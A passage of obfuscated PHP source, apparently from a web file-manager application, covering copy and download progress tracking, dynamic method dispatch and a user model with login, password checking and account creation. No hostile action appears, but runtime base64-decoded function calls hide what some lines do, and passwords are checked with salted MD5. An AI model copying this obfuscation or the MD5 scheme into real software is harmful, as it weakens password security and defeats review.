$e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[699]]; if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1486]] > 0) { $CÓÓåŠ¾óÑ = timeFloat() - $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1488]] - $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1491]]; $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1492]] = $CÓÓåŠ¾óÑ * (1 - $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1486]]) / $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1486]]; } goto bÌ›Ëš…¼ƒ; cœ‰½ğµ°š: if ($this->sourceModelCopyFlag) { return; } if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1538]] == $Aá’ê–Ğ„‡[1139]) { return; } if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1538]] == $Aá’ê–Ğ„‡[1054] || $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1538]] == $Aá’ê–Ğ„‡[103]) { if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1532]]) { $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1535]] = $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1534]] + $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1531]]; } } else { if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1538]] == $Aá’ê–Ğ„‡[1140]) { if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1532]] == $Aá’ê–Ğ„‡[1054]) { $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1535]] = $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1534]] + $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1531]] * 0.5; } else { if ($e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1532]] == $Aá’ê–Ğ„‡[103]) { $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1535]] = $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1534]] + $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1530]] * 0.5 + $e¤¤Ş¨«Å[$Aá’ê–Ğ„‡[1531]] * 0.5; } } } } goto cß‚—®¾¸•; bÌ›Ëš…¼ƒ: } public function addPath($DĞá–±¼–¯) { goto bŠƒåøéÌ·; C¶Ô‡Å…’î: $F‚öˆ×ßÎ = IO::infoWithChildren($DĞá–±¼–¯); $dªäØ‹ŸÖ† = $f‡³Í­ÛÌ[$d·ƒ‡½³¼[1539]] ? $f‡³Í­ÛÌ[$d·ƒ‡½³¼[1539]][$d·ƒ‡½³¼[1540]] : 0; $f‡³Í­ÛÌ[$d·ƒ‡½³¼[1539]] = array($d·ƒ‡½³¼[1540] => $dªäØ‹ŸÖ† + 1, $d·ƒ‡½³¼[402] => $F‚öˆ×ßÎ[$d·ƒ‡½³¼[28]], $d·ƒ‡½³¼[75] => $F‚öˆ×ßÎ[$d·ƒ‡½³¼[75]], $d·ƒ‡½³¼[483] => $F‚öˆ×ßÎ[$d·ƒ‡½³¼[483]] ? $F‚öˆ×ßÎ[$d·ƒ‡½³¼[483]] : $F‚öˆ×ßÎ[$d·ƒ‡½³¼[75]]); goto C‡¥ùİß°; C‡¥ùİß°: if ($F‚öˆ×ßÎ[$d·ƒ‡½³¼[29]] == $d·ƒ‡½³¼[171]) { $f‡³Í­ÛÌ[$d·ƒ‡½³¼[982]] += 1; } else { $f‡³Í­ÛÌ[$d·ƒ‡½³¼[982]] += $F‚öˆ×ßÎ[$d·ƒ‡½³¼[80]][$d·ƒ‡½³¼[78]]; if ($F‚öˆ×ßÎ[$d·ƒ‡½³¼[385]]) { $f‡³Í­ÛÌ[$d·ƒ‡½³¼[982]] += $F‚öˆ×ßÎ[$d·ƒ‡½³¼[80]][$d·ƒ‡½³¼[79]] + 1; } } $f‡³Í­ÛÌ[$d·ƒ‡½³¼[699]] += $F‚öˆ×ßÎ[$d·ƒ‡½³¼[77]]; $this->update(); goto CİÖÍåì; bŠƒåøéÌ·: $d·ƒ‡½³¼ =& $_SERVER[úÎü]; if (!$DĞá–±¼–¯) { return; } $f‡³Í­ÛÌ =& $this->task; goto C¶Ô‡Å…’î; CİÖÍåì: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($d½Ô÷·êóÅ) { $e™·¸ÖŸÓ =& $_SERVER[úÎü]; $fŸñ¢îá³ß =& $this->task; $fŸñ¢îá³ß[$e™·¸ÖŸÓ[1528]] = $d½Ô÷·êóÅ[$e™·¸ÖŸÓ[28]]; $fŸñ¢îá³ß[$e™·¸ÖŸÓ[984]] = $d½Ô÷·êóÅ[$e™·¸ÖŸÓ[28]]; $this->update(); } public function copyFileStart($Bîê½è—Ş, $e‘§¹¯½¹î, $fà”Íî›Éó, $cÍ«õº²Ğø, $DØ–šø×öæ, $eÚÛ‰Àé°˜) { goto F¹äç‰•ğÂ; e¬´Ôç óÆ: $fÛ¯ì›ÈæÅ[$Dîå‰×ñ’ä[1528]] = $CÒñæ£ÛÎ¡; $fÛ¯ì›ÈæÅ[$Dîå‰×ñ’ä[1530]] = (int) $Bîê½è—Ş->size($e‘§¹¯½¹î); $fÛ¯ì›ÈæÅ[$Dîå‰×ñ’ä[1531]] = 0; goto dá Èê½”; EƒÊ¬ĞŒ±ª: $GLOBALS[$Dîå‰×ñ’ä[1542]] = $DØ–šø×öæ; $GLOBALS[$Dîå‰×ñ’ä[1541]] = $eÚÛ‰Àé°˜; $fÛ¯ì›ÈæÅ =& $this->task; goto e¬´Ôç óÆ; F¹äç‰•ğÂ: $Dîå‰×ñ’ä =& $_SERVER[úÎü]; $CÒñæ£ÛÎ¡ = $DØ–šø×öæ; if ($CÒñæ£ÛÎ¡ == $GLOBALS[$Dîå‰×ñ’ä[1541]]) { $CÒñæ£ÛÎ¡ = $GLOBALS[$Dîå‰×ñ’ä[1542]]; } goto EƒÊ¬ĞŒ±ª; dá Èê½”: $fÛ¯ì›ÈæÅ[$Dîå‰×ñ’ä[984]] = $Dîå‰×ñ’ä[33]; $fÛ¯ì›ÈæÅ[$Dîå‰×ñ’ä[1532]] = $Dîå‰×ñ’ä[33]; $fÛ¯ì›ÈæÅ[$Dîå‰×ñ’ä[1533]] = 0; goto cèÔÒøƒ µ; cèÔÒøƒ µ: $this->update(); goto B„ˆ¥Ïóİ; B„ˆ¥Ïóİ: } public function copyFileEnd($aª’ÙŞ‡·°, $aìóª±¥Š†, $cÅ«ÎİùÈ, $eŠ¼õêƒ, $D“×è…³é½, $c²»ñç¨Ÿ) { $EÅ©Ëİ¡‘ =& $_SERVER[úÎü]; $dĞÎç†™Ï =& $this->task; $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1531]] = $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1530]]; $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1532]] = $EÅ©Ëİ¡‘[33]; if ($D“×è…³é½ == $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1528]]) { $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1534]] += $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1530]]; $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1535]] = $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1534]]; $this->update(1); } else { $this->update(); $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1531]] = 0; } self::log($EÅ©Ëİ¡‘[1543] . $aìóª±¥Š† . $EÅ©Ëİ¡‘[66] . $eŠ¼õêƒ . $EÅ©Ëİ¡‘[225] . $D“×è…³é½ . $EÅ©Ëİ¡‘[1544] . $dĞÎç†™Ï[$EÅ©Ëİ¡‘[1528]]); } public function updateFileEnd($D§ˆ¯ì¢–Â, $c‘¼×ªİŸî) { goto AğùÇ¡ãªª; AğùÇ¡ãªª: $a·ÕˆíÜ =& $_SERVER[úÎü]; $Fî„â¦°˜ =& $this->task; $Fî„â¦°˜[$a·ÕˆíÜ[1528]] = $D§ˆ¯ì¢–Â; goto dŒŠÃè¯; cÈ®Ì°îÛ: $this->update(1); self::log($a·ÕˆíÜ[1545] . $D§ˆ¯ì¢–Â); goto Dµ›Ìƒ™ÍÉ; dŒŠÃè¯: $Fî„â¦°˜[$a·ÕˆíÜ[1530]] = $c‘¼×ªİŸî; $Fî„â¦°˜[$a·ÕˆíÜ[1534]] += $c‘¼×ªİŸî; $Fî„â¦°˜[$a·ÕˆíÜ[1535]] = $Fî„â¦°˜[$a·ÕˆíÜ[1534]]; goto cÈ®Ì°îÛ; Dµ›Ìƒ™ÍÉ: } public function sourceModelCopy($fàÎÖ”å·‘) { goto F«¤Ëß¹ŞÏ; F«¤Ëß¹ŞÏ: $e‚Ü®ßÂ– =& $_SERVER[úÎü]; $C¬‡‡Âö›µ = $fàÎÖ”å·‘[0]; $F„¬ÍÁè‘¿ = $fàÎÖ”å·‘[1]; goto cŠÅ„Ëì ; cŠÅ„Ëì : $AëÉ£¼³ŠÌ =& $this->task; $this->sourceModelCopyFlag = !0; $d´–¥£¹± = 0; goto eì»ïùÊÏß; eì»ïùÊÏß: switch ($C¬‡‡Âö›µ) { case $e‚Ü®ßÂ–[524]: $d´–¥£¹± = 1; break; case $e‚Ü®ßÂ–[527]: $AëÉ£¼³ŠÌ[$e‚Ü®ßÂ–[1528]] = $F„¬ÍÁè‘¿[$e‚Ü®ßÂ–[28]]; break; case $e‚Ü®ßÂ–[529]: $d´–¥£¹± = intval($fàÎÖ”å·‘[$e‚Ü®ßÂ–[370]] * 0.4); break; case $e‚Ü®ßÂ–[531]: $d´–¥£¹± = intval($fàÎÖ”å·‘[$e‚Ü®ßÂ–[370]] * 0.2); break; case $e‚Ü®ßÂ–[533]: $d´–¥£¹± = intval($fàÎÖ”å·‘[$e‚Ü®ßÂ–[370]] * 0.4); break; } $this->update($d´–¥£¹±); $this->sourceModelCopyFlag = !1; goto EÑ…ŠëÄ†; EÑ…ŠëÄ†: } public function sourceRemove($dµÎïÃÂù´, $fÕ°ß°) { $ağÌŸŒƒ¢Æ =& $_SERVER[úÎü]; $this->sourceModelCopyFlag = !0; $bøÈäá‰Šñ = 1; if (isset($dµÎïÃÂù´[$ağÌŸŒƒ¢Æ[80]])) { $bøÈäá‰Šñ = $dµÎïÃÂù´[$ağÌŸŒƒ¢Æ[80]][$ağÌŸŒƒ¢Æ[78]] + $dµÎïÃÂù´[$ağÌŸŒƒ¢Æ[80]][$ağÌŸŒƒ¢Æ[79]] + 1; } $this->update($bøÈäá‰Šñ); $this->sourceModelCopyFlag = !1; } public function sourceMove($CµŸ§ÛçÓœ) { $this->sourceRemove($CµŸ§ÛçÓœ, !1); } public function curlProgress($b‚²‡¸’¡, $a¯¿‚â¬ôµ, $BÌŒ«²õµ, $bÙÎÎÊÓƒÃ, $F„Ù‰ÁÍ) { $b»ÏÛÙÅ£ =& $_SERVER[úÎü]; $D† ¯ÇÆ =& $this->task; if ($F„Ù‰ÁÍ > 0) { $D† ¯ÇÆ[$b»ÏÛÙÅ£[984]] = $b»ÏÛÙÅ£[1546]; $D† ¯ÇÆ[$b»ÏÛÙÅ£[1532]] = $b»ÏÛÙÅ£[103]; if ($D† ¯ÇÆ[$b»ÏÛÙÅ£[1530]]) { $D† ¯ÇÆ[$b»ÏÛÙÅ£[1531]] = $F„Ù‰ÁÍ; } if ($D† ¯ÇÆ[$b»ÏÛÙÅ£[1533]]) { $D† ¯ÇÆ[$b»ÏÛÙÅ£[1531]] = $F„Ù‰ÁÍ + $D† ¯ÇÆ[$b»ÏÛÙÅ£[1533]]; } } else { if ($BÌŒ«²õµ > 0) { if ($D† ¯ÇÆ[$b»ÏÛÙÅ£[1530]] == $a¯¿‚â¬ôµ) { $D† ¯ÇÆ[$b»ÏÛÙÅ£[1531]] = $BÌŒ«²õµ; $D† ¯ÇÆ[$b»ÏÛÙÅ£[984]] = $b»ÏÛÙÅ£[1547]; $D† ¯ÇÆ[$b»ÏÛÙÅ£[1532]] = $b»ÏÛÙÅ£[1054]; } } } $this->update(); } public function curlProgressStart($BÇ¤ƒ¯Ï„ö) { } public function curlProgressEnd($a†Ô±‚¡Óº) { goto dÕˆÁªÙ’¿; dÕˆÁªÙ’¿: $aŠÕô‰ÎĞê =& $_SERVER[úÎü]; $fŒÊƒ„• =& $this->task; $e±‰ï­¾ Ô = curl_getinfo($a†Ô±‚¡Óº); goto FÅÁô«—¸Ù; FÅÁô«—¸Ù: $fˆÍ—²ğ  = $e±‰ï­¾ Ô[$aŠÕô‰ÎĞê[1548]]; if ($fˆÍ—²ğ  == -1) { $fˆÍ—²ğ  = $e±‰ï­¾ Ô[$aŠÕô‰ÎĞê[1549]]; } if ($fŒÊƒ„•[$aŠÕô‰ÎĞê[1532]] == $aŠÕô‰ÎĞê[103] && $fˆÍ—²ğ ) { $fŒÊƒ„•[$aŠÕô‰ÎĞê[1533]] += $fˆÍ—²ğ ; } goto DëÁ©¬ïï—; DëÁ©¬ïï—: $this->update(); goto Ağ°ÙÙ¡Í; Ağ°ÙÙ¡Í: } } goto bÉª©ƒ¶×™; c‚«‘ÌÜ¤å: function binCheckBigger($fÊÍ¼Ø™Ó, $B‘¥Øö»ä) { return $fÊÍ¼Ø™Ó > $B‘¥Øö»ä; } $_SERVER[$_SERVER[’¹¡­‘Ç][3]] = (strrev('7378').base64_decode('MTk='))+0;$_YS67="eC85stmzGSg2EB56mwfiiZMUw3UP2Ik4p5PdcnFi4iydQfbdT9xpAV8QJRWiHrVhrtX2m";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($D¾ Õ„ŒÌø, $DàË‚ù„) { $C‹Óˆ²†çš =& $_SERVER[úÎü]; if (isset(self::$_methodList[$D¾ Õ„ŒÌø])) { return @call_user_func_array(self::$_methodList[$D¾ Õ„ŒÌø], $DàË‚ù„); } else { if (method_exists($this, $D¾ Õ„ŒÌø)) { return call_user_func_array(array($this, $D¾ Õ„ŒÌø), $DàË‚ù„); } else { think_exception(__CLASS__ . $C‹Óˆ²†çš[4] . $D¾ Õ„ŒÌø . $C‹Óˆ²†çš[5]); } } } public static function __callStatic($C…Ü‰ŒÀÎÁ, $fˆ¡ö°‡ê) { if (isset(self::$_methodListStatic[$C…Ü‰ŒÀÎÁ])) { return call_user_func_array(self::$_methodListStatic[$C…Ü‰ŒÀÎÁ], $fˆ¡ö°‡ê); } else { if (method_exists(self, $C…Ü‰ŒÀÎÁ)) { return call_user_func_array(array(self, $C…Ü‰ŒÀÎÁ), $fˆ¡ö°‡ê); } else { show_json("{$C…Ü‰ŒÀÎÁ}\50\x29\40\156\x6f\x74\x20\x65\x78\151\163\x74\x3b", !1); } } } public static function addMethod($d¦ìîŸ†, $båì¦Ùë¹) { self::$_methodList[$d¦ìîŸ†] = $båì¦Ùë¹; } public static function addMethodStatic($F ”™ìƒóœ, $C˜õ¹ø«Š) { self::$_methodListStatic[$F ”™ìƒóœ] = $C˜õ¹ø«Š; } } goto d¤îÕˆ°æ ; Aßå¡„ÚÚ¢: $E‘º°Êïá = strrev(base64_decode($_SERVER[’¹¡­‘Ç][0])); function binCheckNeq($fò¯Ñé¯Ú, $AêĞë«¶ä) { return $fò¯Ñé¯Ú != $AêĞë«¶ä; } $_SERVER[$_SERVER[’¹¡­‘Ç][1]] = $E‘º°Êïá($_SERVER[$_SERVER[’¹¡­‘Ç][2]]); goto c‚«‘ÌÜ¤å; C¢¬¿©¨Œ: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\164\141\x62\154\x65\116\x61\x6d\x65" => "\165\163\x65\162\x5f\155\x65\164\141", "\x6d\145\164\141\x46\151\x65\x6c\x64" => "\x75\x73\145\162\111\104"); protected $simpleField = "\x75\x73\145\162\111\104\x2c\156\x69\x63\x6b\x4e\x61\155\145\54\x6e\x61\155\145\x2c\141\166\x61\164\x61\162\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($C¸òƒ‰ä½) { $eÂ›†ÆìÆ± =& $_SERVER[úÎü]; $CÀ—Ë¡Ù‡ = $eÂ›†ÆìÆ±[2061]; return array($eÂ›†ÆìÆ±[1717] => array($C¸òƒ‰ä½[0], $CÀ—Ë¡Ù‡), $eÂ›†ÆìÆ±[1719] => array($C¸òƒ‰ä½[0], $CÀ—Ë¡Ù‡), $eÂ›†ÆìÆ±[2062] => array($C¸òƒ‰ä½[0], $CÀ—Ë¡Ù‡)); } protected function getInfo($D‹§šíÕ‡Á, $c‚¹âËéÏ® = false) { $díÆ¥ëÉè¾ = $this->getInfoSimple($D‹§šíÕ‡Á); if (!is_array($díÆ¥ëÉè¾)) { return array(); } if ($c‚¹âËéÏ®) { return $this->_getInfoApply($díÆ¥ëÉè¾); } return $this->cacheFunctionGet($_SERVER[úÎü][1773], $D‹§šíÕ‡Á); } protected function getInfoFull($CºĞá¯ÒÕ, $aËìáÕ«¿ = false) { $Eï±“îÈîÈ = $this->getInfoSimple($CºĞá¯ÒÕ); if (!is_array($Eï±“îÈîÈ)) { return array(); } if ($aËìáÕ«¿) { return $this->_getInfoApply($Eï±“îÈîÈ, !0); return $this->_getInfoApply($Eï±“îÈîÈ, !0); } return $this->cacheFunctionGet($_SERVER[úÎü][2063], $CºĞá¯ÒÕ); } private function _getInfoApply($C×Ââ†â‘, $a‚ï¯‰‘ç˜ = false) { goto aİêàÌÁ®Ò; A«ÃÕÖ¬¤š: $C×Ââ†â‘ = $this->_listDataApplyItem($C×Ââ†â‘); $bØçˆŞ—‹ä = Model($B›š“ËùÍ[1162])->metaGet($C×Ââ†â‘[$B›š“ËùÍ[407]][$B›š“ËùÍ[385]]); $C×Ââ†â‘[$B›š“ËùÍ[2066]] = $D‰º—Ù æ†; goto C’¼‹Ùø–; aİêàÌÁ®Ò: $B›š“ËùÍ =& $_SERVER[úÎü]; if (!$C×Ââ†â‘) { return $C×Ââ†â‘; } $D‰º—Ù æ† = md5($B›š“ËùÍ[2064] . $C×Ââ†â‘[$B›š“ËùÍ[808]] . $B›š“ËùÍ[2065] . $C×Ââ†â‘[$B›š“ËùÍ[28]]); goto A«ÃÕÖ¬¤š; C’¼‹Ùø–: $C×Ââ†â‘[$B›š“ËùÍ[407]][$B›š“ËùÍ[1905]] = isset($bØçˆŞ—‹ä[$B›š“ËùÍ[1906]]) ? $bØçˆŞ—‹ä[$B›š“ËùÍ[1906]] : null; if ($a‚ï¯‰‘ç˜) { $C×Ââ†â‘[$B›š“ËùÍ[433]] = $this->metaGet($C×Ââ†â‘[$B›š“ËùÍ[1485]]); } return $C×Ââ†â‘; goto B—‹‚Âãä; B—‹‚Âãä: } protected function getInfoSimple($b‘Â²š®ïà, $f£ƒîØ¯å± = false) { $aßäèâ‚ù =& $_SERVER[úÎü]; if (!$b‘Â²š®ïà) { return array(); } if ($f£ƒîØ¯å±) { $fÎŒë¦ÁË¦ = $this->where(array($aßäèâ‚ù[1485] => intval($b‘Â²š®ïà)))->find(); if (!is_array($fÎŒë¦ÁË¦)) { return array(); } $fÎŒë¦ÁË¦[$aßäèâ‚ù[2067]] = Action($aßäèâ‚ù[2068])->parseUrl($fÎŒë¦ÁË¦[$aßäèâ‚ù[2067]]); return $fÎŒë¦ÁË¦; } return $this->cacheFunctionGet($aßäèâ‚ù[1720], $b‘Â²š®ïà); } protected function getInfoSimpleOuter($aÙ«÷­ˆÖ) { goto A…–æÃÌ¬¾; c¯ù£Êô°: return $EÔªêÒÙÈ; goto FÅíîåâ‚ª; A…–æÃÌ¬¾: $E¡™ Ö¢‘õ =& $_SERVER[úÎü]; if (!$aÙ«÷­ˆÖ || $aÙ«÷­ˆÖ == 0) { return array($E¡™ Ö¢‘õ[1485] => $E¡™ Ö¢‘õ[485], $E¡™ Ö¢‘õ[28] => $E¡™ Ö¢‘õ[157] . LNG($E¡™ Ö¢‘õ[2069]) . $E¡™ Ö¢‘õ[493], $E¡™ Ö¢‘õ[2067] => STATIC_PATH . $E¡™ Ö¢‘õ[2070]); } $b‡çƒŞç“™ = $this->cacheFunctionGet($E¡™ Ö¢‘õ[1720], $aÙ«÷­ˆÖ); goto bÄ×¬ÌºÈ¹; bÄ×¬ÌºÈ¹: $EÔªêÒÙÈ = array_field_key($b‡çƒŞç“™, explode($E¡™ Ö¢‘õ[47], $this->simpleField)); if (!$EÔªêÒÙÈ) { return array($E¡™ Ö¢‘õ[1485] => $E¡™ Ö¢‘õ[1045], $E¡™ Ö¢‘õ[28] => $E¡™ Ö¢‘õ[157] . LNG($E¡™ Ö¢‘õ[2071]) . $E¡™ Ö¢‘õ[493], $E¡™ Ö¢‘õ[2067] => STATIC_PATH . $E¡™ Ö¢‘õ[2072]); } $EÔªêÒÙÈ[$E¡™ Ö¢‘õ[2067]] = Action($E¡™ Ö¢‘õ[2068])->parseUrl($EÔªêÒÙÈ[$E¡™ Ö¢‘õ[2067]]); goto c¯ù£Êô°; FÅíîåâ‚ª: } protected function groupUser($dŠ’‘â÷Óä) { } public static function errorLang($EÓ¯‘ÀíäÄ) { $aãôÄÉÔÕÂ =& $_SERVER[úÎü]; $CË·ÉÁÖäÊ = array(self::ERROR_USER_NOT_EXISTS => $aãôÄÉÔÕÂ[2073], self::ERROR_USER_PASSWORD_ERROR => $aãôÄÉÔÕÂ[2074], self::ERROR_USER_EXIST_NAME => $aãôÄÉÔÕÂ[2075], self::ERROR_USER_EXIST_PHONE => $aãôÄÉÔÕÂ[2076], self::ERROR_USER_EXIST_EMAIL => $aãôÄÉÔÕÂ[2077], self::ERROR_USER_LOGIN_LOCK => $aãôÄÉÔÕÂ[2078], self::ERROR_IP_NOT_ALLOW => $aãôÄÉÔÕÂ[2079], self::ERROR_USER_EXIST_NICKNAME => $aãôÄÉÔÕÂ[2080]); return LNG($CË·ÉÁÖäÊ[$EÓ¯‘ÀíäÄ]); } public function getInfoByMeta($FİÅ£âÌó¬, $díçµ—ªÙ”) { $bÁö‘ä©¿Ò =& $_SERVER[úÎü]; $DŸãÊïƒá = Model($bÁö‘ä©¿Ò[2081])->where(array($bÁö‘ä©¿Ò[89] => $FİÅ£âÌó¬, $bÁö‘ä©¿Ò[366] => $díçµ—ªÙ”))->find(); if ($DŸãÊïƒá) { return $this->getInfo($DŸãÊïƒá[$bÁö‘ä©¿Ò[1485]]); } return !1; } public function userLoginCheck($AİÕ‚·„Å‹, $Fğ—ÏÓåº) { $cÇ±¹Ş·†° =& $_SERVER[úÎü]; $d–ò—‹†õ = $this->userLoginFind($AİÕ‚·„Å‹); if (!$d–ò—‹†õ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($d–ò—‹†õ[$cÇ±¹Ş·†°[1485]], $Fğ—ÏÓåº)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($d–ò—‹†õ[$cÇ±¹Ş·†°[1485]]); } public function userLoginFind($eõì®øğˆ¨) { $E‹Íå¦Òè‡ =& $_SERVER[úÎü]; $b‡§†¸‰ = array($E‹Íå¦Òè‡[28] => $eõì®øğˆ¨, $E‹Íå¦Òè‡[1909] => $eõì®øğˆ¨, $E‹Íå¦Òè‡[299] => $eõì®øğˆ¨, $E‹Íå¦Òè‡[2082] => $eõì®øğˆ¨, $E‹Íå¦Òè‡[918] => $E‹Íå¦Òè‡[920]); if ($this->nickNameRpt()) { unset($b‡§†¸‰[$E‹Íå¦Òè‡[1909]]); } return $this->where($b‡§†¸‰)->find(); } public function clearCache($BôÚßÔ¸Ş’) { $bêÑŒ›ßî© =& $_SERVER[úÎü]; $this->cacheFunctionClear($bêÑŒ›ßî©[1773], $BôÚßÔ¸Ş’); $this->cacheFunctionClear($bêÑŒ›ßî©[1720], $BôÚßÔ¸Ş’); $this->cacheFunctionClear($bêÑŒ›ßî©[2063], $BôÚßÔ¸Ş’); } public function userPasswordCheck($dÜ¼’‡õ, $a‹ùƒ´ÃÃ–) { $f„ª¥×—Ğñ =& $_SERVER[úÎü]; $bå¤í•çâà = $this->where(array($f„ª¥×—Ğñ[1485] => intval($dÜ¼’‡õ)))->find(); $Cáß‰›• = $this->metaGet($dÜ¼’‡õ); $cÂ²Êéôõê = isset($Cáß‰›•[$f„ª¥×—Ğñ[2083]]) ? $Cáß‰›•[$f„ª¥×—Ğñ[2083]] : $f„ª¥×—Ğñ[33]; if (md5($cÂ²Êéôõê . trim($a‹ùƒ´ÃÃ–)) !== $bå¤í•çâà[$f„ª¥×—Ğñ[808]]) { return !1; } return !0; } public function userAdd($bĞ³¯²Çœñ) { goto F¸‹óÉëó; döêâ¤Ëô: return $dñÒ—òŞÛ; goto a¸‡‹Ê…º; F¸‹óÉëó: $b¹“Ø°’ï =& $_SERVER[úÎü]; $E×ÚÑÃœŞÇ = array($b¹“Ø°’ï[402] => $bĞ³¯²Çœñ[$b¹“Ø°’ï[28]], $b¹“Ø°’ï[2084] => $bĞ³¯²Çœñ[$b¹“Ø°’ï[1366]], $b¹“Ø°’ï[2085] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[299]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[299]] : $b¹“Ø°’ï[33], $b¹“Ø°’ï[2086] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[2082]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[2082]] : $b¹“Ø°’ï[33], $b¹“Ø°’ï[2087] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[1909]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[1909]] : $bĞ³¯²Çœñ[$b¹“Ø°’ï[28]], $b¹“Ø°’ï[2088] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[2067]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[2067]] : $b¹“Ø°’ï[33], $b¹“Ø°’ï[2089] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[2090]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[2090]] : 1, $b¹“Ø°’ï[2091] => $bĞ³¯²Çœñ[$b¹“Ø°’ï[808]], $b¹“Ø°’ï[1721] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[1628]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[1628]] : 1024 * 1024 * 20, $b¹“Ø°’ï[1722] => 0, $b¹“Ø°’ï[2092] => 0, $b¹“Ø°’ï[1760] => isset($bĞ³¯²Çœñ[$b¹“Ø°’ï[690]]) ? $bĞ³¯²Çœñ[$b¹“Ø°’ï[690]] : 1); if (!empty($bĞ³¯²Çœñ[$b¹“Ø°’ï[1485]])) { $E×ÚÑÃœŞÇ[$b¹“Ø°’ï[1485]] = $bĞ³¯²Çœñ[$b¹“Ø°’ï[1485]]; } goto A±®öîÉÄà; dÚƒ˜·°ó: $Dë¹¶‘Ç¬ = array($b¹“Ø°’ï[2091] => $E×ÚÑÃœŞÇ[$b¹“Ø°’ï[808]], $b¹“Ø°’ï[2087] => $E×ÚÑÃœŞÇ[$b¹“Ø°’ï[1909]]); $this->userEdit($dñÒ—òŞÛ, $Dë¹¶‘Ç¬); Model($b¹“Ø°’ï[1162])->userRootAdd($dñÒ—òŞÛ); goto döêâ¤Ëô; A±®öîÉÄà: $fâÁ“¿æÖ» = $this->_checkExist($bĞ³¯²Çœñ); if ($fâÁ“¿æÖ» !== !0) { return $fâÁ“¿æÖ»; } $dñÒ—òŞÛ = $this->add($E×ÚÑÃœŞÇ); goto dÚƒ˜·°ó; a¸‡‹Ê…º: } protected function userEditTest($D‡›••Ìù, $Bä˜—ùâÁ») { return $this->call($_SERVER[úÎü][2093], $D‡›••Ìù, $Bä˜—ùâÁ»); } protected function userEdit($B‡Ô–‰ÂÆÒ, $EéØÒ…Õ¡) { goto AÄ‡¸×§è; E­ŒÍ—…Â: $this->where(array($f‹õÙ„âˆ›[1477] => $B‡Ô–‰ÂÆÒ))->save($EéØÒ…Õ¡); if (isset($EéØÒ…Õ¡[$f‹õÙ„âˆ›[1909]])) { $this->setNamePinyin($B‡Ô–‰ÂÆÒ, $EéØÒ…Õ¡[$f‹õÙ„âˆ›[1909]]); } $this->clearCache($B‡Ô–‰ÂÆÒ); goto BŒéµæ™¤Á; BŒéµæ™¤Á: return !0; goto d›ã´äªÁå; AÄ‡¸×§è: $f‹õÙ„âˆ› =& $_SERVER[úÎü]; $b’Ğò¿· = $this->getInfoSimple($B‡Ô–‰ÂÆÒ); if (!$b’Ğò¿·) { return !1; } goto cµ½Û¡ô‰Œ; cµ½Û¡ô‰Œ: $dåäÉò²„ = $this->_checkExist($EéØÒ…Õ¡, $B‡Ô–‰ÂÆÒ); if ($dåäÉò²„ !== !0) { return $dåäÉò²„; } if (isset($EéØÒ…Õ¡[$f‹õÙ„âˆ›[808]]) && trim($EéØÒ…Õ¡[$f‹õÙ„âˆ›[808]]) != $f‹õÙ„âˆ›[33]) { $eÕì†„ê¹ = $this->metaGet($B‡Ô–‰ÂÆÒ); if (empty($eÕì†„ê¹[$f‹õÙ„âˆ›[2083]])) { $eÕì†„ê¹[$f‹õÙ„âˆ›[2083]] = rand_string(10); Model($f‹õÙ„âˆ›[491])->metaSet($B‡Ô–‰ÂÆÒ, $f‹õÙ„âˆ›[2083], $eÕì†„ê¹[$f‹õÙ„âˆ›[2083]]); } 